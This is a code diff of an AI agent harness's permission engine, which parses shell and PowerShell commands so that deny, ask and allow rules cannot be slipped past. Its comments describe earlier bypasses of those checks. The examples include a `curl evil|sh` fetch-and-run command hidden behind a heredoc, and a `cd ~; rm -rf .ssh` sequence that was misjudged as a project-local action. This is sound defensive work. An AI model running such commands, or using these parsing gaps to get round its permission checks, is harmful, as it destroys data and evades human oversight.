@@ -34,7 +34,9 @@ from pathlib import Path
 from typing import Optional
 
 from halo_harness import perm_ps as _pa
+from halo_harness import perm_scan as _scan
 from halo_harness import perm_shell as _ps
+from halo_harness import perm_words as _words
 
 # =============================================================================
 # 1. Pattern-content helpers.
@@ -213,6 +215,10 @@ def split_powershell_segments(command: str) -> list:
                 in_double = False
             i += 1
             continue
+        here_end = _pa.herestring_end(command, i)
+        if here_end is not None:  # review item 93: `@"...\n"@` is one opaque span
+            buf.append(command[i:here_end]); i = here_end
+            continue
         if c == "'":
             in_single = True; buf.append(c); i += 1; continue
         if c == '"':
@@ -244,7 +250,7 @@ def ps_candidates(command: str, _depth: int = 0) -> list:
         if cleaned != seg:
             out.append(cleaned)
         if _depth < 3:
-            for payload in _pa.payloads(seg):
+            for payload in _pa.payloads(seg) + _pa.start_process_targets(seg):
                 out.extend(ps_candidates(payload, _depth + 1))
     if _depth < 3:
         for body in _pa.bodies(command):
@@ -427,50 +433,16 @@ def _skip_heredoc(command: str, start: int) -> Optional[int]:
     "body", and hid every later command on the line from segment
     splitting (with allow `cat:*`, `cat <<< x; curl evil|sh` was allowed
     whole). Returns None for `<<<` so the splitter keeps scanning."""
-    n = len(command)
-    if command[start:start + 3] == "<<<":
+    opener = _scan.heredoc_opener(command, start)
+    if opener is None:
         return None
-    j = start + 2
-    if j < n and command[j] == "-":
-        j += 1
-    while j < n and command[j] in " \t":
-        j += 1
-    if j >= n:
-        return None
-    quote = None
-    if command[j] in ("'", '"'):
-        quote = command[j]
-        j += 1
-        delim_start = j
-        end_quote = command.find(quote, j)
-        if end_quote == -1:
-            return None
-        delim = command[delim_start:end_quote]
-        j = end_quote + 1
-    else:
-        delim_start = j
-        while j < n and not command[j].isspace() and command[j] not in "&|;":
-            j += 1
-        delim = command[delim_start:j].lstrip("\\")
-    if not delim:
-        return None
-    nl = command.find("\n", j)
-    body_start = nl + 1 if nl != -1 else n
-    strip_tabs = command[start:start + 3] == "<<-"
-    k = body_start
-    while k <= n:
-        line_end = command.find("\n", k)
-        line = command[k:line_end if line_end != -1 else n]
-        probe = line.lstrip("\t") if strip_tabs else line
-        if probe == delim:
-            return (line_end + 1) if line_end != -1 else n
-        if line_end == -1:
-            return n  # unterminated heredoc -- consume to EOF rather than mis-split its body
-        k = line_end + 1
-    return n
+    delim_end, delim, strip_tabs = opener
+    nl = command.find("\n", delim_end)
+    body_start = nl + 1 if nl != -1 else len(command)
+    return _scan.heredoc_body_end(command, body_start, delim, strip_tabs)
 
 
-def split_bash_segments(command: str) -> list:
+def split_bash_segments(command: str, *, opener_scan: bool = False) -> list:
     """Quote/escape-aware split on `&&`, `||`, `;`, `;;`, `|`, `|&`, `&`,
     newline -- never splits inside a quoted string, a backtick span, a
     `$( )`/`( )`/`{ }` group, or a heredoc body (finding 11: `<<DELIM` ...
@@ -478,11 +450,18 @@ def split_bash_segments(command: str) -> list:
     command separator). A bare `&` is a background-job separator UNLESS it
     is part of a redirection -- immediately after `>`/`<` (`2>&1`, `<&3`)
     or immediately before `>` (`&>file`, `&>>file`) -- in which case it
-    stays literal text in the current segment."""
+    stays literal text in the current segment.
+
+    `opener_scan=True` (deny/ask/mode-table callers only; allow-rule
+    matching keeps the default): the rest of a heredoc's OPENER line is
+    still scanned for separators -- bash runs `rm x` in
+    `cat <<EOF; rm x` before it reads the body -- and the body itself is
+    appended, as opaque text, to the segment in progress when the line ends."""
     segments, buf = [], []
     i, n = 0, len(command)
     depth = 0
     in_single = in_double = False
+    pending_bodies: list = []
 
     def _flush():
         segments.append("".join(buf))
@@ -518,6 +497,23 @@ def split_bash_segments(command: str) -> list:
             # the run can't re-enter the heredoc branch below).
             buf.append("<<<")
             i += 3
+            continue
+        if depth == 0 and command[i:i + 2] == "<<" and opener_scan:
+            opener = _scan.heredoc_opener(command, i)
+            if opener is not None:
+                buf.append(command[i:opener[0]])
+                pending_bodies.append(opener[1:])
+                i = opener[0]
+                continue
+        if depth == 0 and c == "\n" and pending_bodies:
+            k = i + 1
+            for delim, strip_tabs in pending_bodies:
+                end = _scan.heredoc_body_end(command, k, delim, strip_tabs)
+                buf.append("\n" + command[k:end])
+                k = end
+            pending_bodies.clear()
+            _flush()
+            i = k
             continue
         if depth == 0 and command[i:i + 2] == "<<":
             end = _skip_heredoc(command, i)
@@ -563,32 +559,10 @@ def split_bash_segments(command: str) -> list:
 def extract_subshell_bodies(command: str) -> list:
     """Every `$( ... )` and `` ` ... ` `` span's INNER text (DENY/ASK also
     scan these, per D-CFG: "raw + normalised + subshell bodies are all
-    checked, one hit fires")."""
-    bodies = []
-    i, n = 0, len(command)
-    while i < n:
-        if command[i:i + 2] == "$(":
-            depth = 1
-            j = i + 2
-            start = j
-            while j < n and depth > 0:
-                if command[j] == "(":
-                    depth += 1
-                elif command[j] == ")":
-                    depth -= 1
-                j += 1
-            bodies.append(command[start:j - 1] if depth == 0 else command[start:j])
-            i = j
-            continue
-        if command[i] == "`":
-            j = command.find("`", i + 1)
-            if j == -1:
-                break
-            bodies.append(command[i + 1:j])
-            i = j + 1
-            continue
-        i += 1
-    return bodies
+    checked, one hit fires"). Quote- and comment-aware (review item 20):
+    a `$(` inside single quotes or after `#` runs nothing; inside double
+    quotes it still runs. Nested spans are included."""
+    return _scan.span_bodies(command)[0]
 
 
 # ALLOW-only normalization: these wrap a real command without changing
@@ -662,13 +636,16 @@ def _tokenize_loose(segment: str) -> list:
 # generic "-i takes a value" rule swallowed the `rm` itself).
 _WRAPPER_VALUE_OPTS = {
     "timeout": {"-s", "-k", "--signal", "--kill-after"},
+    "time": {"-f", "-o", "--format", "--output"},
     "nice": {"-n", "--adjustment"},
     "ionice": {"-c", "-n", "--class", "--classdata"},
-    "sudo": {"-u", "-g", "-p", "-D", "-R", "--user", "--group", "--chdir",
-             "--role", "--type", "--other-user", "--close-from"},
+    "sudo": {"-u", "-g", "-p", "-D", "-R", "-r", "-t", "-h", "-C", "-T", "-U", "--user", "--group",
+             "--chdir", "--role", "--type", "--host", "--other-user", "--close-from", "--command-timeout"},
     "doas": {"-u"},
-    "env": {"-u", "--unset"},
-    "xargs": {"-I", "-o", "-P", "--replace", "--max-procs"},
+    "env": {"-u", "--unset", "-C", "--chdir"},
+    # review item 3: `-o` (--open-tty) takes NO value; -n/-L/-s/-d/-a/-E do.
+    "xargs": {"-I", "-P", "-n", "-L", "-s", "-d", "-a", "-E", "--replace", "--max-procs", "--max-args",
+              "--max-lines", "--max-chars", "--arg-file", "--delimiter", "--eof"},
     "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
     **_ps.EXTRA_WRAPPER_VALUE_OPTS,
 }
@@ -686,6 +663,12 @@ def strip_wrappers_and_env_for_deny(segment: str) -> str:
     timeout/nice's bare numeric duration/priority) so the REAL command
     surfaces. This only ever ADDS deny candidates -- it can make a deny
     rule fire sooner, never silence one."""
+    return " ".join(_deny_tokens(segment))
+
+
+def _deny_tokens(segment: str) -> list:
+    """The token list behind `strip_wrappers_and_env_for_deny` (quoted
+    words stay whole, so a `sh -c 'rm x'` payload survives intact)."""
     tokens = _tokenize_loose(segment.strip())
     changed = True
     while changed and tokens:
@@ -715,13 +698,28 @@ def strip_wrappers_and_env_for_deny(segment: str) -> str:
                         and "=" not in opt:
                     tokens.pop(0)
             if wrapper in _ps.NUMERIC_AFTER_OPTS and tokens \
-                    and tokens[0].lstrip("+-").replace(".", "", 1).isdigit():
+                    and _ps.NUMERIC_ARG_RE.fullmatch(tokens[0]):
                 tokens.pop(0)
             positional = _ps.EXTRA_WRAPPER_POSITIONAL.get(wrapper, 0)
             if positional and not (seen_opts & _ps.POSITIONAL_SKIPPED_BY.get(wrapper, set())):
                 del tokens[:positional]
             changed = True
-    return " ".join(tokens)
+    return tokens
+
+
+def _segment_payloads(seg: str) -> list:
+    """Command text one segment hands on to be run: wrapper `-c` strings
+    and exec arguments (perm_shell.payload_strings), the `-c STRING` of a
+    shell (`sh -c`, `sudo bash -lc`), and `eval`'s joined arguments (review
+    item 16). Literal text only, matched against the user's own rules."""
+    out = list(_ps.payload_strings(seg))
+    tokens = _deny_tokens(seg)
+    shell = _words.shell_c_payload(tokens)
+    if shell:
+        out.append(shell)
+    if len(tokens) > 1 and tokens[0] == "eval":
+        out.append(" ".join(tokens[1:]))
+    return out
 
 
 def _extract_group_bodies(command: str) -> list:
@@ -730,44 +728,10 @@ def _extract_group_bodies(command: str) -> list:
     `<(...)`. `extract_subshell_bodies` above only covers `$(...)` and
     backticks -- a deny rule on `rm` never saw `( rm -rf x )`,
     `{ rm x; }` or `<(rm x)` because those parentheses are grouped, not
-    command-substituted, and the group's own text was never a candidate."""
-    bodies = []
-    i, n = 0, len(command)
-    while i < n:
-        c = command[i]
-        if command[i:i + 2] == "<(":
-            i += 2
-            depth, start = 1, i
-            while i < n and depth:
-                if command[i] == "(":
-                    depth += 1
-                elif command[i] == ")":
-                    depth -= 1
-                i += 1
-            bodies.append(command[start:i - 1] if depth == 0 else command[start:i])
-            continue
-        if c == "(":
-            depth, start = 1, i + 1
-            j = i + 1
-            while j < n and depth:
-                if command[j] == "(":
-                    depth += 1
-                elif command[j] == ")":
-                    depth -= 1
-                j += 1
-            bodies.append(command[start:j - 1] if depth == 0 else command[start:j])
-            i = j
-            continue
-        if c == "{":
-            nxt = command[i + 1] if i + 1 < n else ""
-            if nxt in (" ", "\t", "\n", ";"):
-                j = command.find("}", i + 1)
-                if j != -1:
-                    bodies.append(command[i + 1:j])
-                    i = j + 1
-                    continue
-        i += 1
-    return [b for b in bodies if b.strip()]
+    command-substituted, and the group's own text was never a candidate.
+    Review item 20: parentheses/braces inside a quoted string or a `#`
+    comment are text, not a group; nested groups are included."""
+    return _scan.span_bodies(command)[1]
 
 
 def _basename_first(segment: str) -> str:
@@ -801,7 +765,7 @@ def _is_opaque_reexec(command: str) -> bool:
         head = tokens[0]
         if head == "eval":
             return True
-        if head in ("sh", "bash", "zsh", "dash", "ksh") and "-c" in tokens[1:2] or tokens[1:2] == ["-c"]:
+        if head in ("sh", "bash", "zsh", "dash", "ksh") and tokens[1:2] == ["-c"]:
             return True
         # finding 12: `bash -lc '...'` (clustered flags) and a script fed on
         # stdin (`sh <<EOF`, `sh <<< 'rm x'`, `... | sh`) are the same
@@ -999,14 +963,20 @@ def bash_deny_or_ask_matches(command: str, rules: list) -> Optional["Rule"]:
     strip_wrappers_and_env_for_deny). All of these only ADD candidates:
     a deny rule can fire sooner, never be silenced."""
     candidates = [_collapse_ws(command)]
-    for seg in split_bash_segments(command):
+    bodies: list = []
+    # review item 1: the opener-scan split (a command after a heredoc
+    # opener on the same line is its own segment); review item 20: span
+    # bodies are read per segment, quote- and comment-aware.
+    for seg in split_bash_segments(command, opener_scan=True):
         candidates.append(_collapse_ws(seg))
         candidates.append(strip_wrappers_and_env_for_deny(seg))
         b = _basename_first(seg)
         if b:
             candidates.append(_collapse_ws(b))
         candidates.extend(_extra_deny_candidates(seg))
-    for body in extract_subshell_bodies(command) + _extract_group_bodies(command):
+        subs, groups = _scan.span_bodies(seg)
+        bodies.extend(subs + groups)
+    for body in bodies:
         candidates.append(_collapse_ws(body))
         stripped = strip_wrappers_and_env_for_deny(body)
         if stripped and stripped != body:
@@ -1017,7 +987,7 @@ def bash_deny_or_ask_matches(command: str, rules: list) -> Optional["Rule"]:
         # finding 2 (follow-up): a body is a whole mini-command --
         # `$(true; rm x)`'s body "true; rm x" needs its own segment split
         # before a prefix rule on `rm` can see the `rm x` inside it.
-        for sub_seg in split_bash_segments(body):
+        for sub_seg in split_bash_segments(body, opener_scan=True):
             candidates.append(_collapse_ws(sub_seg))
             sub_stripped = strip_wrappers_and_env_for_deny(sub_seg)
             if sub_stripped and sub_stripped != sub_seg:
@@ -1048,9 +1018,11 @@ def _extra_deny_candidates(seg: str, _depth: int = 0) -> list:
         if no_opts:
             forms.append(_collapse_ws(no_opts))
     if _depth < 3:
-        for payload in _ps.payload_strings(seg):
-            for sub in split_bash_segments(payload) or [payload]:
-                forms.extend(_extra_deny_candidates(sub, _depth + 1))
+        for payload in _segment_payloads(seg):
+            subs, groups = _scan.span_bodies(payload)
+            for part in [payload] + subs + groups:
+                for sub in split_bash_segments(part, opener_scan=True) or [part]:
+                    forms.extend(_extra_deny_candidates(sub, _depth + 1))
     return [f for f in forms if f]
 
 
@@ -1142,9 +1114,14 @@ def parse_rule(raw: str, *, source: str = "", base_dir: Optional[Path] = None,
                 return Rule(tool=raw, kind="invalid", raw=raw, source=source,
                             error="a bare tool-name glob is deny/ask only")
             return Rule(tool=raw, kind="tool_glob", raw=raw, source=source)
-        return Rule(tool=raw, kind="bare", raw=raw, source=source)
+        # review item 92: `Task` is the historical name of `Agent` -- a rule
+        # spelled either way governs the one tool (calls are canonicalised
+        # to `Agent` in PermissionEngine._decide).
+        return Rule(tool="Agent" if raw == "Task" else raw, kind="bare", raw=raw, source=source)
 
     tool = raw[:idx]
+    if tool == "Task":
+        tool = "Agent"
     if not raw.endswith(")") or "(" in tool or ")" in tool:
         return Rule(tool=tool, kind="invalid", raw=raw, source=source, error="malformed rule")
     content_raw = raw[idx + 1:-1]
@@ -1214,6 +1191,14 @@ class Decision:
     permission_denial: Optional[dict] = None
 
 
+def _str_field(tool_input, key: str) -> str:
+    """review item 21: a tool_input field as a string -- "" when it is
+    missing, null, a list, a number... (the tool itself reports the bad
+    argument; the permission check must not crash on it)."""
+    value = tool_input.get(key) if isinstance(tool_input, dict) else None
+    return value if isinstance(value, str) else ""
+
+
 def _escape_rule_content(text: str) -> str:
     """`\\`->`\\\\` FIRST, then `(`->`\\(`, `)`->`\\)` -- the inverse of
     `parse_rule`'s own unescape, used by both `add_allow_rule` and
@@ -1254,7 +1239,9 @@ def _applicable_path_rule_source_tools(calling_tool_name: str, action: str) -> s
 
 
 def _bash_command_all_segments_readonly(command: str) -> bool:
-    segments = split_bash_segments(command)
+    # review item 1: a command on a heredoc's opener line is a segment of
+    # its own here too (the mode table and the plan-mode ban use this).
+    segments = split_bash_segments(command, opener_scan=True)
     return bool(segments) and all(is_read_only_bash_segment(s) for s in segments)
 
 
@@ -1281,8 +1268,8 @@ def bare_deny_tool_names(deny_rules: list) -> set:
     (its registered alias -- the same tool under the other name; the
     alias used to survive the removal entirely)."""
     names = {r.tool for r in deny_rules if r.kind == "bare"}
-    if "Agent" in names:
-        names.add("Task")
+    if "Agent" in names or "Task" in names:  # review item 92: both directions
+        names |= {"Agent", "Task"}
     return names
 
 
@@ -1555,8 +1542,8 @@ class PermissionEngine:
         return False
 
     def _resolve_target_path(self, path_str: str) -> Optional[Path]:
-        if not path_str:
-            return None
+        if not path_str or not isinstance(path_str, str):
+            return None  # review item 21: a non-string path names nothing
         p = Path(path_str)
         return p if p.is_absolute() else (self.cwd / p)
 
@@ -1590,10 +1577,10 @@ class PermissionEngine:
         if rule.kind == "skill":
             return tool_name == "Skill" and tool_input.get("skill") == rule.value
         if rule.kind == "skill_prefix":
-            val = tool_input.get("skill", "")
+            val = _str_field(tool_input, "skill")
             return tool_name == "Skill" and (val == rule.value or val.startswith(rule.value + " "))
         if rule.kind == "domain":
-            return tool_name == "WebFetch" and domain_rule_matches(rule.value, tool_input.get("url", ""))
+            return tool_name == "WebFetch" and domain_rule_matches(rule.value, _str_field(tool_input, "url"))
         if rule.kind == "param":
             return tool_name == rule.tool and str(tool_input.get(rule.param_key)) == rule.param_value
         if rule.kind == "path":
@@ -1607,7 +1594,7 @@ class PermissionEngine:
             if rule.tool != tool_name:
                 return False
             if tool_name == "PowerShell":
-                return powershell_rule_matches(rule.kind, rule.value, tool_input.get("command", ""))
+                return powershell_rule_matches(rule.kind, rule.value, _str_field(tool_input, "command"))
             content = tool.permission_content(tool_input) if tool is not None else ""
             return _pattern_matches_text(rule.kind, rule.value, content)
         return False
@@ -1635,7 +1622,7 @@ class PermissionEngine:
         path_rules = [r for r in rules if r.kind == "path" and r.tool in applicable]
         if not path_rules:
             return None
-        path_str = tool.permission_content(tool_input) if tool is not None else tool_input.get("file_path", "")
+        path_str = tool.permission_content(tool_input) if tool is not None else _str_field(tool_input, "file_path")
         target = self._resolve_target_path(path_str)
         if target is None:
             return None
@@ -1683,24 +1670,48 @@ class PermissionEngine:
     # readers whose first non-option word is a pattern / script, not a path
     _BASH_PATTERN_FIRST = frozenset({"grep", "egrep", "fgrep", "rg", "ag", "sed", "awk", "gawk", "mawk", "jq"})
     _REDIRECT_IN_RE = re.compile(r"(?<![<>&])<(?![<(&>])\s*(\S+)")
+    _PATTERN_LONG = ("--regexp", "--expression")
+    _PATTERN_FILE_LONG = ("--file", "--from-file", "--files-from")
 
     def _bash_reader_paths(self, head: str, args: list) -> list:
         """The path-like words of one reader command: every non-option
-        argument (a pattern/script word is skipped unless `-e`/`-f` supplied
-        it), the value of `--opt=value`, and for `cp` only the sources."""
+        argument, the value of `--opt=value`, and for `cp` only the sources.
+        For a pattern-first reader (grep/sed/awk/jq...) the first non-option
+        word is the pattern/script and is skipped -- unless an option already
+        supplied it: `-e X`/`-f FILE`, glued `-eX`/`-fFILE`/`-nep`, or
+        `--regexp=X`/`--expression=X`/`--file=FILE` (review item 19). Options
+        of other readers (`cat -e`, `tail -f`) never consume a word."""
         paths: list = []
-        pattern_given = head not in self._BASH_PATTERN_FIRST
+        pattern_first = head in self._BASH_PATTERN_FIRST
+        pattern_given = not pattern_first
         positional: list = []
         skip_next = False
         for tok in args:
             if skip_next:
                 skip_next = False
                 continue
-            if tok in ("-e", "--regexp"):
-                pattern_given, skip_next = True, True
-                continue
-            if tok in ("-f", "--file", "--from-file", "-T", "--files-from"):
-                pattern_given = True
+            if pattern_first and tok.startswith("--"):
+                name, eq, value = tok.partition("=")
+                if name in self._PATTERN_LONG:
+                    pattern_given, skip_next = True, not eq
+                    continue
+                if name in self._PATTERN_FILE_LONG:
+                    pattern_given = True
+                    if eq:
+                        paths.append(value)
+                    continue
+            if pattern_first and tok.startswith("-") and not tok.startswith("--") and tok != "-":
+                for k, ch in enumerate(tok[1:], start=1):
+                    if not ch.isalpha():
+                        break
+                    if ch in "ef":
+                        pattern_given = True
+                        glued = tok[k + 1:]
+                        if ch == "e" and not glued:
+                            skip_next = True
+                        elif ch == "f" and glued:
+                            paths.append(glued)
+                        break
                 continue
             if tok.startswith("--") and "=" in tok:
                 paths.append(tok.split("=", 1)[1])
@@ -1716,54 +1727,92 @@ class PermissionEngine:
             positional = positional[:-1]  # the last word is the destination
         return paths + positional
 
-    def _bash_read_units(self, command: str) -> list:
-        """Every command-line fragment a reader could hide in: the segments,
-        the `$()`/backtick/group bodies' segments, and exec payloads."""
+    @staticmethod
+    def _reader_walks_dirs(head: str, args: list) -> bool:
+        """review item 19: readers that read every file below a directory
+        operand (`grep -r`, `rg`, `ag`, `cp -r`, `tar c`)."""
+        flags = [a for a in args if a.startswith("-") and a != "-"]
+        short = "".join(a[1:].split("e", 1)[0].split("f", 1)[0] for a in flags if not a.startswith("--"))
+        if head in ("rg", "ag"):
+            return True
+        if head in ("grep", "egrep", "fgrep"):
+            return "r" in short or "R" in short or any(
+                a in ("--recursive", "--dereference-recursive", "--directories=recurse") for a in flags)
+        if head == "cp":
+            return any(c in short for c in "rRa") or any(a in ("--recursive", "--archive") for a in flags)
+        if head == "tar":
+            first = args[0] if args else ""
+            return "c" in first.lstrip("-") or "--create" in args
+        return False
+
+    def _bash_read_units(self, command: str, cwd: "Optional[Path]", _depth: int = 0) -> list:
+        """[(fragment, cwd in effect)] for every command-line fragment a
+        reader could hide in: the segments, the `$()`/backtick/group bodies'
+        segments, and exec/`-c` payloads (review item 2: each fragment keeps
+        the cwd in effect at ITS point, a subshell's `cd` stays inside it)."""
         units: list = []
-        for part in [command] + extract_subshell_bodies(command) + _extract_group_bodies(command):
-            for seg in split_bash_segments(part):
-                units.append(seg)
-                units.extend(_ps.payload_strings(seg))
+        pairs, _final = self._bash_cwd_walk(command, cwd)
+        for seg, seg_cwd in pairs:
+            units.append((seg, seg_cwd))
+            if _depth >= 3:
+                continue
+            subs, groups = _scan.span_bodies(seg, nested=False)
+            for part in subs + groups + _segment_payloads(seg):
+                units.extend(self._bash_read_units(part, seg_cwd, _depth + 1))
         return units
 
     def _bash_read_deny_hit(self, command: str, action: str = "deny") -> Optional[Rule]:
         """vibes/review.md finding 10: a Read deny/ask PATH rule also gates
         Bash file-reader commands. For every segment whose effective
         command is a reader, every non-option argument is resolved against
-        the live cwd (finding 7) and tested against the Read path rules --
-        one hit fires. Nothing happens when no Read path rule exists (the
-        overwhelmingly common case -- zero added friction). 2.0.10 finding
-        15: `~`/`$HOME` words expand, `< file` redirections count, glob
-        words expand against the live cwd, bodies and payloads are scanned,
-        and the reader set includes grep/sed/awk/cp/tar and friends."""
+        the cwd in effect for that segment and tested against the Read path
+        rules -- one hit fires. Nothing happens when no Read path rule exists
+        (the overwhelmingly common case -- zero added friction). `~`/`$HOME`/
+        `$PWD` words and `{a,b}` braces expand, `< file` redirections count,
+        glob words expand, and a recursive reader's directory operand is
+        walked (bounded). A relative word under an unknown cwd (`cd $X`) is
+        not resolved at all -- no guess at what it names."""
         rules = self.deny_rules if action == "deny" else self.ask_rules
-        read_path_rules = [r for r in rules if r.kind == "path" and r.tool == "Read"]
-        if not read_path_rules:
+        if not any(r.kind == "path" and r.tool == "Read" for r in rules):
             return None
-        live_cwd = self._bash_live_cwd(command)
-        if live_cwd is None:
-            live_cwd = self.cwd
-        for seg in self._bash_read_units(command):
-            stripped = strip_wrappers_and_env_for_deny(seg)
-            tokens = _tokenize_loose(stripped)
-            words = [m.strip("'\"") for m in self._REDIRECT_IN_RE.findall(seg)]
-            if tokens:
-                head = tokens[0].replace("\\", "/").rsplit("/", 1)[-1]
-                if head in self._BASH_FILE_READERS:
-                    words += self._bash_reader_paths(head, tokens[1:])
-            for tok in words:
+        for seg, cwd in self._bash_read_units(command, self.cwd):
+            hit = self._bash_unit_read_hit(seg, cwd, rules, action)
+            if hit is not None:
+                return hit
+        return None
+
+    def _bash_unit_read_hit(self, seg: str, cwd: "Optional[Path]", rules: list, action: str) -> Optional[Rule]:
+        tokens = _deny_tokens(seg)
+        words = [m.strip("'\"") for m in self._REDIRECT_IN_RE.findall(seg)]
+        walks = False
+        head = tokens[0].replace("\\", "/").rsplit("/", 1)[-1] if tokens else ""
+        if tokens:
+            if head in self._BASH_FILE_READERS:
+                operands = self._bash_reader_paths(head, tokens[1:])
+                words += operands
+                walks = self._reader_walks_dirs(head, tokens[1:])
+                if walks and not operands and head != "cp" and cwd is not None:
+                    words.append(".")  # `grep -r X` / `rg X` search the cwd
+        skip_hidden = head in ("rg", "ag") and not any(
+            t in ("--hidden", "-.") or re.fullmatch(r"-u+", t) or t == "--unrestricted" for t in tokens)
+        for raw in words:
+            raw = _ps.expand_pwd_token(_ps.expand_home_token(raw), cwd)
+            for tok in _words.brace_expand(raw):
                 tok = _ps.expand_home_token(tok)
                 if any(ch in tok for ch in "<>{}$`"):
+                    continue
+                rooted = Path(tok).is_absolute() or tok.startswith(("/", "\\"))
+                if not rooted and cwd is None:
                     continue
                 targets = [tok]
                 if any(ch in tok for ch in "*?["):
                     import glob as _glob
-                    base = tok if Path(tok).is_absolute() else str(live_cwd / tok)
-                    targets = _glob.glob(base)[:200]
+                    targets = _glob.glob(tok if rooted else str(cwd / tok))[:200]
                 for t in targets:
-                    candidate = Path(t)
-                    target = candidate if candidate.is_absolute() else (live_cwd / candidate)
+                    target = Path(t) if (Path(t).is_absolute() or rooted) else (cwd / t)
                     hit = self._path_rule_hit(rules, "Read", {"file_path": str(target)}, None, action=action)
+                    if hit is None and walks:
+                        hit = self._dir_rule_hit(rules, target, action, skip_hidden=skip_hidden)
                     if hit is not None:
                         return hit
         return None
@@ -1781,6 +1830,30 @@ class PermissionEngine:
         return self._path_rule_hit(self.deny_rules, "Read", {"file_path": str(path)}, None,
                                    action="deny") is not None
 
+    def _dir_rule_hit(self, rules: list, target: Path, action: str, *, skip_hidden: bool = False) -> Optional[Rule]:
+        """Bounded walk of directory `target`: the first file a Read path
+        rule in `rules` names, or None (also None when `target` is no
+        directory or the walk passes 20000 files)."""
+        try:
+            if not target.is_dir():
+                return None
+        except OSError:
+            return None
+        seen = 0
+        for root, dirs, files in os.walk(str(target)):
+            dirs[:] = [d for d in dirs if d not in (".git", "node_modules")
+                       and not (skip_hidden and d.startswith("."))]
+            for name in files:
+                if skip_hidden and name.startswith("."):
+                    continue
+                seen += 1
+                if seen > 20000:
+                    return None
+                hit = self._path_rule_hit(rules, "Read", {"file_path": os.path.join(root, name)}, None, action=action)
+                if hit is not None:
+                    return hit
+        return None
+
     def _dir_read_ask_hit(self, tool_name: str, tool_input: dict) -> Optional[Rule]:
         """A Grep/Glob whose directory holds a file a Read ASK rule names is
         asked about as a whole (a result list cannot be half-asked). Bounded
@@ -1789,27 +1862,11 @@ class PermissionEngine:
             return None
         if not any(r.kind == "path" and r.tool == "Read" for r in self.ask_rules):
             return None
-        target = self._resolve_target_path(tool_input.get("path", "")) or self.cwd
-        try:
-            if not target.is_dir():
-                return None
-        except OSError:
-            return None
-        seen = 0
-        for root, dirs, files in os.walk(str(target)):
-            dirs[:] = [d for d in dirs if d not in (".git", "node_modules")]
-            for name in files:
-                seen += 1
-                if seen > 20000:
-                    return None
-                hit = self._path_rule_hit(self.ask_rules, "Read", {"file_path": os.path.join(root, name)},
-                                          None, action="ask")
-                if hit is not None:
-                    return hit
-        return None
+        target = self._resolve_target_path(_str_field(tool_input, "path")) or self.cwd
+        return self._dir_rule_hit(self.ask_rules, target, "ask")
 
     def _decide_bash(self, tool_input: dict) -> Decision:
-        command = tool_input.get("command", "")
+        command = _str_field(tool_input, "command")
         bash_rules = lambda rs: [r for r in rs if r.tool == "Bash"]  # noqa: E731
 
         deny_bare = [r for r in bash_rules(self.deny_rules) if r.kind == "bare"]
@@ -1872,7 +1929,7 @@ class PermissionEngine:
     # ---- PowerShell gets the same segment-split treatment (finding 1) -----
 
     def _decide_powershell(self, tool_input: dict) -> Decision:
-        command = tool_input.get("command", "")
+        command = _str_field(tool_input, "command")
         ps_rules = lambda rs: [r for r in rs if r.tool == "PowerShell"]  # noqa: E731
 
         deny_bare = [r for r in ps_rules(self.deny_rules) if r.kind == "bare"]
@@ -1903,6 +1960,12 @@ class PermissionEngine:
         if self.mode in ("auto", "bypassPermissions"):
             return Decision("allow", "mode allows (no deny/ask rule matched)", source="mode")
 
+        # review item 91: the plan-mode ban runs BEFORE allow rules here too
+        # (there is no PowerShell read-only list, so it covers every call --
+        # the mode table already denies PowerShell in plan mode without rules).
+        if self.mode == "plan":
+            return Decision("deny", "plan mode: PowerShell commands are not run in plan mode "
+                            "(an allow rule cannot lift the plan-mode write ban)", source="mode")
         allow_bare = [r for r in ps_rules(self.allow_rules) if r.kind == "bare"]
         allow_patterned = [r for r in ps_rules(self.allow_rules) if r.kind in ("exact", "prefix", "glob")]
         if allow_bare or any(powershell_rule_matches(r.kind, r.value, command) for r in allow_patterned):
@@ -1931,14 +1994,14 @@ class PermissionEngine:
 
     def _categorize(self, tool_name: str, tool_input: dict, tool) -> str:
         if tool_name == "Read":
-            path_str = tool.permission_content(tool_input) if tool is not None else tool_input.get("file_path", "")
+            path_str = tool.permission_content(tool_input) if tool is not None else _str_field(tool_input, "file_path")
             target = self._resolve_target_path(path_str)
             return "read_in_workdir" if (target is None or self._in_working_dirs(target)) else "read_outside"
         if tool_name in ("Glob", "Grep"):
-            target = self._resolve_target_path(tool_input.get("path", ""))
+            target = self._resolve_target_path(_str_field(tool_input, "path"))
             return "read_in_workdir" if (target is None or self._in_working_dirs(target)) else "read_outside"
         if tool_name == "Bash":
-            command = tool_input.get("command", "")
+            command = _str_field(tool_input, "command")
             if _bash_command_all_segments_readonly(command):
                 return "readonly_bash"
             if self._bash_is_edit_like_in_workdir(command):
@@ -1966,76 +2029,81 @@ class PermissionEngine:
             return "edit_write_in_workdir" if (target is not None and self._in_working_dirs(target)) else "other"
         return "other"
 
-    def _bash_live_cwd(self, command: str) -> "Optional[Path]":
-        """vibes/review.md finding 7: the shell's LIVE working directory
-        after `command`'s own `cd` segments, starting from this engine's
-        cwd. `cd ~` then `rm -rf .ssh` used to be judged against
-        `<project>/.ssh` (auto-allowed in acceptEdits) while actually
-        deleting `~/.ssh`. None means "cannot be determined confidently"
-        (`cd $VAR`, an unreadable target) -- callers must treat that as
-        OUTSIDE the working dirs, never as the project cwd."""
-        cwd = self.cwd
-        for seg in split_bash_segments(command):
-            try:
-                tokens = shlex.split(seg, posix=True)
-            except ValueError:
+    _CD_OPT_RE = re.compile(r"-[LPe@]+")
+
+    @classmethod
+    def _cd_destination(cls, args: list, cur: "Optional[Path]", *, pushd: bool = False) -> "Optional[Path]":
+        """review item 2: where `cd ARGS` / `pushd ARGS` leaves the shell,
+        given the cwd before it (None = unknown). Option words (`-L`, `-P`,
+        `-e`, `-@`, `--`) are skipped; no operand is $HOME for cd (a bare
+        `pushd` swaps the stack: unknown); `-`, `+N`/`-N`, `$VAR`, `~user`
+        and anything relative to an unknown cwd are unknown. `~` resolves to
+        the real machine home, the same `~` the shell expands."""
+        i = 0
+        while i < len(args) and args[i].startswith("-") and args[i] != "-":
+            if args[i] == "--":
+                i += 1
+                break
+            if not cls._CD_OPT_RE.fullmatch(args[i]):
                 return None
-            while tokens and _ENV_ASSIGN_RE.match(tokens[0]):
+            i += 1
+        if i >= len(args):
+            return None if pushd else Path.home()
+        dest = _ps.expand_pwd_token(_ps.expand_home_token(args[i]), cur)
+        if dest == "-" or dest.startswith("~") or "$" in dest or "`" in dest:
+            return None
+        if pushd and re.fullmatch(r"[+-]\d+", dest):
+            return None
+        p = Path(dest)
